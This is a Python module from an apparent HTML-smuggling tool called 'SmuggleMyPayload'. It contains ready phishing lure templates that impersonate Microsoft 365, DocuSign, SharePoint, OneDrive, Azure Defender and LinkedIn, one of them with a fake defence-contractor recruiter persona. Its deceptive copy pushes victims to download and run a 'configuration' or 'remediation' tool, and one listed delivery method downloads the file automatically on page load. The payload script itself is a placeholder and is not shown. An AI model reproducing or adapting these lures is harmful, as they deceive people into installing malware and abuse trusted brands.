"""
SmuggleMyPayload — HTML Template Strings & Style Metadata

Each template uses __PLACEHOLDER__ markers replaced by build_html().
Templates: MS365 MFA, DocuSign, SharePoint, OneDrive, Azure, LinkedIn, Custom
"""


# -- Template & Method Metadata --

TEMPLATES = {
    '1': 'Microsoft 365 — Security Update',
    '2': 'DocuSign — Document Ready',
    '3': 'SharePoint — File Shared',
    '4': 'OneDrive — Secure Download',
    '5': 'Azure Portal — Security Alert',
    '6': 'LinkedIn — Shared Document',
    '7': 'Custom',
}

METHODS = {
    '1': 'Click-to-download (button trigger)',
    '2': 'Auto-download on page load',
}

DEFAULT_OUTPUT = {
    '1': 'mfa_update.html',
    '2': 'docusign_review.html',
    '3': 'sharepoint_share.html',
    '4': 'onedrive_download.html',
    '5': 'azure_security.html',
    '6': 'linkedin_shared.html',
    '7': 'custom_lure.html',
}

STYLES = {
    '1': {
        'title': 'Microsoft — Security Update Required',
        'heading': 'Action Required: Update Security Configuration',
        'body': (
            'Your organization has enabled enhanced security policies that '
            'require an update to your multi-factor authentication configuration. '
            'To maintain uninterrupted access to Microsoft 365 services, please '
            'download and run the configuration utility below.'
        ),
        'btn_text': 'Download Configuration Tool',
        'accent': '#0078d4',
        'footer': 'Microsoft Corporation',
    },
    '2': {
        'title': 'DocuSign — Review Document',
        'heading': 'Please review and sign your document',
        'body': (
            'A document has been sent to you for electronic signature. '
            'Download the secure document viewer to review the agreement '
            'and complete your signature.'
        ),
        'btn_text': 'Review Document',
        'accent': '#003da5',
        'accent2': '#c5b358',
        'footer': 'DocuSign, Inc.',
    },
    '3': {
        'title': 'SharePoint — File Shared With You',
        'heading': 'A file has been shared with you',
        'body': (
            'You have a new file available for download. This file was shared '
            'through your organization\'s SharePoint. Download it to your '
            'device to view the contents.'
        ),
        'btn_text': 'Download',
        'accent': '#038387',
        'footer': 'Microsoft SharePoint',
    },
    '4': {
        'title': 'OneDrive — Secure Download',
        'heading': 'Your file is ready to download',
        'body': (
            'A file has been securely shared with you via OneDrive. '
            'This download link will expire in 24 hours. '
            'Please download the file to your device before it expires.'
        ),
        'btn_text': 'Download Now',
        'accent': '#0364b8',
        'footer': 'Microsoft OneDrive',
    },
    '5': {
        'title': 'Azure Portal — Security Alert',
        'heading': 'Security Alert: Immediate Action Required',
        'body': (
            'Azure Defender has detected suspicious activity associated '
            'with your subscription. Download and run the remediation '
            'tool to resolve the security findings.'
        ),
        'btn_text': 'Download Remediation Tool',
        'accent': '#0089d6',
        'footer': 'Microsoft Azure',
    },
    '6': {
        'title': 'LinkedIn — Shared Document',
        'heading': 'shared a document with you',
        'body': (
            'This document was shared through LinkedIn\'s secure document '
            'sharing. Download to review the full contents.'
        ),
        'btn_text': 'Download Document',
        'accent': '#0a66c2',
        'sender_name': 'Sarah Chen',
        'sender_title': 'Senior Talent Acquisition · Northrop Grumman',
        'sender_initials': 'SC',
        'footer': 'LinkedIn Corporation',
    },
}


# -- HTML Templates --

MS365_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:4px;padding:44px;max-width:520px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.1)}
.logo{display:flex;align-items:center;gap:10px;margin-bottom:32px}
.logo-text{font-size:18px;font-weight:600;color:#242424}
.divider{height:1px;background:#e8e8e8;margin:0 0 28px}
h1{font-size:20px;font-weight:600;color:#242424;margin-bottom:16px;line-height:1.4}
p{font-size:14px;color:#616161;line-height:1.7;margin-bottom:14px}
.deadline{font-size:13px;color:#c50f1f;font-weight:600;margin-bottom:24px}
.btn{display:inline-block;padding:10px 24px;background:__ACCENT__;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;font-family:inherit;transition:background .15s}
.btn:hover{filter:brightness(0.9)}
.bar{height:3px;background:#e8e8e8;border-radius:2px;margin-top:20px;display:none;overflow:hidden}
.fill{height:100%;background:__ACCENT__;width:0;border-radius:2px;transition:width .4s ease}
.msg{font-size:12px;color:#616161;margin-top:8px;min-height:16px;display:none}
.footer{margin-top:36px;font-size:11px;color:#8a8886;text-align:center;line-height:2}
.footer a{color:__ACCENT__;text-decoration:none}
</style>
</head>
<body>
__DECOYS__
<div class="card">
  <div class="logo">
    __BRAND_LOGO__
    <span class="logo-text">Microsoft</span>
  </div>
  <div class="divider"></div>
  <h1>__HEADING__</h1>
  <p>__BODY__</p>
  <p class="deadline">Required by: __DEADLINE__</p>
  <button class="btn" id="btn" onclick="__FN__()">__BTN__</button>
  <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
  <div class="msg" id="msg"></div>
</div>
<div class="footer">
  &copy; __YEAR__ __FOOTER__<br>
  <a href="#" style="color:__ACCENT__;text-decoration:none">Privacy</a> &middot; <a href="#" style="color:__ACCENT__;text-decoration:none">Terms</a>
</div>
<script>
__JS__
</script>
</body>
</html>'''


DOCUSIGN_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f4f4f4;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.top-bar{background:__ACCENT__;height:4px;width:100%;max-width:560px;border-radius:4px 4px 0 0}
.card{background:#fff;border-radius:0 0 6px 6px;padding:40px 44px;max-width:560px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,.08)}
.logo{display:flex;align-items:center;gap:10px;margin-bottom:28px}
.logo-text{font-size:20px;font-weight:700;color:#1a1a2e;letter-spacing:-0.3px}
.badge{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;background:#eef6ee;color:#1a1a2e;font-size:13px;font-weight:600;border-radius:20px;margin-bottom:18px}
h1{font-size:22px;font-weight:600;color:#1a1a2e;margin-bottom:14px;line-height:1.3}
.meta{font-size:12px;color:#8e8e8e;margin-bottom:16px}
.doc-row{display:flex;align-items:center;gap:14px;padding:14px 18px;background:#fafafa;border:1px solid #e8e8e8;border-radius:8px;margin-bottom:18px}
.doc-icon{width:40px;height:40px;border-radius:6px;background:#c7372f;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800}
.doc-name{font-size:14px;font-weight:500;color:#1a1a2e}
.doc-meta{font-size:12px;color:#8e8e8e;margin-top:2px}
p{font-size:14px;color:#555;line-height:1.6;margin-bottom:18px}
.btn{display:inline-block;padding:12px 28px;background:__ACCENT2__;color:#1a1a2e;font-size:15px;font-weight:700;border:none;border-radius:4px;cursor:pointer;font-family:inherit}
.btn:hover{filter:brightness(0.95)}
.bar{height:3px;background:#e8e8e8;border-radius:2px;margin-top:20px;display:none;overflow:hidden}
.fill{height:100%;background:__ACCENT__;width:0;border-radius:2px;transition:width .4s ease}
.msg{font-size:12px;color:#666;margin-top:8px;min-height:16px;display:none}
.footer{margin-top:32px;font-size:11px;color:#999;text-align:center;line-height:2}
</style>
</head>
<body>
__DECOYS__
<div class="top-bar"></div>
<div class="card">
  <div class="logo">
    __BRAND_LOGO__
    <span class="logo-text">DocuSign</span>
  </div>
  <div class="badge">
    <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M10 3L4.5 8.5 2 6" stroke="#1a1a2e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
    Completed
  </div>
  <h1>__HEADING__</h1>
  <div class="meta">Sent: __TIMESTAMP__</div>
  <div class="doc-row">
    <div class="doc-icon">PDF</div>
    <div>
      <div class="doc-name">__FILENAME__</div>
      <div class="doc-meta">Secure document &middot; Ready for review</div>
    </div>
  </div>
  <p>__BODY__</p>
  <button class="btn" id="btn" onclick="__FN__()">__BTN__</button>
  <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
  <div class="msg" id="msg"></div>
</div>
<div class="footer">
  &copy; __YEAR__ __FOOTER__<br>
  221 Main St, Suite 1550, San Francisco, CA 94105
</div>
<script>
__JS__
</script>
</body>
</html>'''


SHAREPOINT_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f3f2f1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:4px;max-width:520px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.1);overflow:hidden}
.header{background:__ACCENT__;padding:18px 32px;display:flex;align-items:center;gap:10px}
.header svg{flex-shrink:0}
.header-text{color:#fff;font-size:15px;font-weight:600}
.content{padding:32px}
.sender{display:flex;gap:14px;margin-bottom:22px}
.avatar{width:44px;height:44px;border-radius:50%;background:__ACCENT__;color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:600;flex-shrink:0}
.sender-name{font-size:14px;font-weight:600;color:#323130}
.sender-sub{font-size:12px;color:#8a8886;margin-top:2px}
.file-card{display:flex;align-items:center;gap:14px;padding:14px;background:#faf9f8;border:1px solid #edebe9;border-radius:4px;margin-bottom:20px}
.file-icon{width:40px;height:40px;border-radius:4px;background:#217346;display:flex;align-items:center;justify-content:center}
.file-icon svg{width:20px;height:20px}
.file-name{font-size:14px;font-weight:500;color:#323130}
.file-meta{font-size:12px;color:#8a8886;margin-top:2px}
p{font-size:14px;color:#605e5c;line-height:1.7;margin-bottom:20px}
.btn{display:inline-block;padding:10px 24px;background:__ACCENT__;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;font-family:inherit}
.btn:hover{filter:brightness(0.9)}
.bar{height:3px;background:#edebe9;border-radius:2px;margin-top:18px;display:none;overflow:hidden}
.fill{height:100%;background:__ACCENT__;width:0;border-radius:2px;transition:width .4s ease}
.msg{font-size:12px;color:#8a8886;margin-top:8px;min-height:16px;display:none}
.footer{padding:20px 32px;border-top:1px solid #edebe9;font-size:11px;color:#a19f9d;text-align:center}
</style>
</head>
<body>
__DECOYS__
<div class="card">
  <div class="header">
    __BRAND_LOGO__
    <span class="header-text">SharePoint</span>
  </div>
  <div class="content">
    <div class="sender">
      <div class="avatar">IT</div>
      <div>
        <div class="sender-name">IT Department</div>
        <div class="sender-sub">via SharePoint &middot; __TIMESTAMP__</div>
      </div>
    </div>
    <div class="file-card">
      <div class="file-icon">
        <svg viewBox="0 0 20 20" fill="#fff"><path d="M4 2h8l4 4v12a1 1 0 01-1 1H4a1 1 0 01-1-1V3a1 1 0 011-1z"/><path d="M12 2v4h4" fill="none" stroke="#217346" stroke-width="1"/></svg>
      </div>
      <div>
        <div class="file-name">__FILENAME__</div>
        <div class="file-meta">Shared with you &middot; Organization access</div>
      </div>
    </div>
    <p>__BODY__</p>
    <button class="btn" id="btn" onclick="__FN__()">__BTN__</button>
    <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
    <div class="msg" id="msg"></div>
  </div>
  <div class="footer">&copy; __YEAR__ __FOOTER__</div>
</div>
<script>
__JS__
</script>
</body>
</html>'''


ONEDRIVE_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:6px;padding:44px;max-width:500px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,.08);text-align:center}
.cloud{margin:0 auto 28px}
h1{font-size:20px;font-weight:600;color:#242424;margin-bottom:12px}
.file-info{display:inline-flex;align-items:center;gap:8px;padding:10px 18px;background:#f0f6ff;border-radius:20px;margin-bottom:14px;font-size:13px;color:#0364b8;font-weight:500}
p{font-size:14px;color:#616161;line-height:1.7;margin-bottom:8px}
.expire{font-size:12px;color:#c50f1f;font-weight:500;margin-bottom:24px}
.btn{display:inline-block;padding:12px 32px;background:__ACCENT__;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;font-family:inherit}
.btn:hover{filter:brightness(0.9)}
.bar{height:3px;background:#e8e8e8;border-radius:2px;margin-top:20px;display:none;overflow:hidden}
.fill{height:100%;background:__ACCENT__;width:0;border-radius:2px;transition:width .4s ease}
.msg{font-size:12px;color:#616161;margin-top:8px;min-height:16px;display:none}
.footer{margin-top:36px;font-size:11px;color:#8a8886;text-align:center;line-height:2}
</style>
</head>
<body>
__DECOYS__
<div class="card">
  <div class="cloud">
    __BRAND_LOGO__
  </div>
  <h1>__HEADING__</h1>
  <div class="file-info">
    <svg width="14" height="14" viewBox="0 0 14 14" fill="__ACCENT__"><path d="M3 1h5l3 3v8a1 1 0 01-1 1H3a1 1 0 01-1-1V2a1 1 0 011-1z"/></svg>
    __FILENAME__
  </div>
  <p>__BODY__</p>
  <p class="expire">Link expires: __DEADLINE__</p>
  <button class="btn" id="btn" onclick="__FN__()">__BTN__</button>
  <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
  <div class="msg" id="msg"></div>
</div>
<div class="footer">
  &copy; __YEAR__ __FOOTER__<br>
  <a href="#" style="color:__ACCENT__;text-decoration:none">Privacy</a> &middot; <a href="#" style="color:__ACCENT__;text-decoration:none">Terms</a>
</div>
<script>
__JS__
</script>
</body>
</html>'''


AZURE_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#1b1b1b;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;color:#e0e0e0}
.card{background:#2d2d2d;border-radius:4px;padding:40px;max-width:540px;width:100%;border-left:3px solid #f03a17;box-shadow:0 4px 12px rgba(0,0,0,.3)}
.top{display:flex;align-items:center;gap:10px;margin-bottom:24px}
.top svg{flex-shrink:0}
.top-text{font-size:13px;color:#999;text-transform:uppercase;letter-spacing:.8px;font-weight:600}
.alert-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(240,58,23,.15);color:#f03a17;font-size:12px;font-weight:600;padding:6px 12px;border-radius:3px;margin-bottom:20px}
h1{font-size:18px;font-weight:600;color:#f5f5f5;margin-bottom:14px;line-height:1.5}
p{font-size:14px;color:#b0b0b0;line-height:1.7;margin-bottom:16px}
.meta{font-size:12px;color:#777;margin-bottom:20px}
.btn{display:inline-block;padding:10px 24px;background:__ACCENT__;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;font-family:inherit}
.btn:hover{filter:brightness(1.1)}
.bar{height:3px;background:#404040;border-radius:2px;margin-top:20px;display:none;overflow:hidden}
.fill{height:100%;background:__ACCENT__;width:0;border-radius:2px;transition:width .4s ease}
.msg{font-size:12px;color:#999;margin-top:8px;min-height:16px;display:none}
.footer{margin-top:32px;font-size:11px;color:#555;text-align:center;line-height:2}
</style>
</head>
<body>
__DECOYS__
<div class="card">
  <div class="top">
    __BRAND_LOGO__
    <span class="top-text">Azure Defender</span>
  </div>
  <div class="alert-badge">
    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 1L1 13h12L7 1z" stroke="#f03a17" stroke-width="1.5"/><path d="M7 5v3M7 10v.5" stroke="#f03a17" stroke-width="1.5" stroke-linecap="round"/></svg>
    HIGH SEVERITY
  </div>
  <h1>__HEADING__</h1>
  <p>__BODY__</p>
  <div class="meta">Alert ID: AZ-__ALERTID__ &middot; __TIMESTAMP__ UTC</div>
  <button class="btn" id="btn" onclick="__FN__()">__BTN__</button>
  <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
  <div class="msg" id="msg"></div>
</div>
<div class="footer">&copy; __YEAR__ __FOOTER__</div>
<script>
__JS__
</script>
</body>
</html>'''


LINKEDIN_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,system-ui,'Segoe UI',Roboto,sans-serif;background:#f3f2ef;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:8px;max-width:540px;width:100%;box-shadow:0 0 0 1px rgba(0,0,0,.08),0 2px 4px rgba(0,0,0,.08);overflow:hidden}
.header{background:__ACCENT__;padding:16px 28px;display:flex;align-items:center;gap:10px}
.header svg{flex-shrink:0}
.header-text{color:#fff;font-size:16px;font-weight:600}
.content{padding:28px}
.sender{display:flex;gap:14px;margin-bottom:22px}
.avatar{width:52px;height:52px;border-radius:50%;background:__ACCENT__;color:#fff;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:600;flex-shrink:0}
.sender-name{font-size:15px;font-weight:600;color:#191919}
.sender-title{font-size:13px;color:#666;margin-top:3px;line-height:1.4}
.shared-text{font-size:14px;color:#191919;margin-bottom:18px}
.shared-text strong{font-weight:600}
.doc-card{display:flex;align-items:center;gap:14px;padding:16px;background:#f9f9f9;border:1px solid #e8e8e8;border-radius:8px;margin-bottom:20px}
.doc-icon{width:42px;height:42px;background:#c7372f;border-radius:6px;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;flex-shrink:0}
.doc-name{font-size:14px;font-weight:500;color:#191919}
.doc-meta{font-size:12px;color:#888;margin-top:3px}
p{font-size:14px;color:#666;line-height:1.6;margin-bottom:20px}
.btn{display:inline-block;padding:10px 24px;background:__ACCENT__;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:20px;cursor:pointer;font-family:inherit}
.btn:hover{filter:brightness(0.9)}
.bar{height:3px;background:#e8e8e8;border-radius:2px;margin-top:18px;display:none;overflow:hidden}
.fill{height:100%;background:__ACCENT__;width:0;border-radius:2px;transition:width .4s ease}
.msg{font-size:12px;color:#666;margin-top:8px;min-height:16px;display:none}
.footer-wrap{padding:20px 28px;border-top:1px solid #e8e8e8}
.footer{font-size:11px;color:#999;text-align:center;line-height:2}
.footer a{color:__ACCENT__;text-decoration:none}
</style>
</head>
<body>
__DECOYS__
<div class="card">
  <div class="header">
    __BRAND_LOGO__
    <span class="header-text">LinkedIn</span>
  </div>
  <div class="content">
    <div class="sender">
      <div class="avatar">__INITIALS__</div>
      <div>
        <div class="sender-name">__SENDER__</div>
        <div class="sender-title">__SENDER_TITLE__</div>
      </div>
    </div>
    <div class="shared-text"><strong>__SENDER_FIRST__</strong> __HEADING__</div>
    <div class="doc-card">
      <div class="doc-icon">PDF</div>
      <div>
        <div class="doc-name">__FILENAME__</div>
        <div class="doc-meta">PDF &middot; Shared securely via LinkedIn</div>
      </div>
    </div>
    <p>__BODY__</p>
    <button class="btn" id="btn" onclick="__FN__()">__BTN__</button>
    <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
    <div class="msg" id="msg"></div>
  </div>
  <div class="footer-wrap">
    <div class="footer">
      &copy; __YEAR__ __FOOTER__<br>
      <a href="#">Help Center</a> &middot; <a href="#">Privacy Policy</a>
    </div>
  </div>
</div>
<script>
__JS__
</script>
</body>
</html>'''


CUSTOM_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,'Segoe UI',sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:6px;padding:44px;max-width:520px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,.08)}
.logo-text{font-size:20px;font-weight:700;color:#333;margin-bottom:28px}
.divider{height:2px;background:__ACCENT__;margin-bottom:28px;border-radius:1px}
h1{font-size:20px;font-weight:600;color:#333;margin-bottom:16px;line-height:1.4}
p{font-size:14px;color:#555;line-height:1.7;margin-bottom:20px}
.btn{display:inline-block;padding:12px 28px;background:__ACCENT__;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;font-family:inherit}
.btn:hover{filter:brightness(0.9)}
.bar{height:3px;background:#e0e0e0;border-radius:2px;margin-top:20px;display:none;overflow:hidden}
.fill{height:100%;background:__ACCENT__;width:0;border-radius:2px;transition:width .4s ease}
.msg{font-size:12px;color:#666;margin-top:8px;min-height:16px;display:none}
.footer{margin-top:36px;font-size:11px;color:#999;text-align:center}
</style>
</head>
<body>
__DECOYS__
<div class="card">
  <div class="logo-text">__LOGO_TEXT__</div>
  <div class="divider"></div>
  <h1>__HEADING__</h1>
  <p>__BODY__</p>
  <button class="btn" id="btn" onclick="__FN__()">__BTN__</button>
  <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
  <div class="msg" id="msg"></div>
</div>
<div class="footer">&copy; __YEAR__ __LOGO_TEXT__</div>
<script>
__JS__
</script>
</body>
</html>'''


TEMPLATE_HTML = {
    '1': MS365_HTML,
    '2': DOCUSIGN_HTML,
    '3': SHAREPOINT_HTML,
    '4': ONEDRIVE_HTML,
    '5': AZURE_HTML,
    '6': LINKEDIN_HTML,
    '7': CUSTOM_HTML,
}
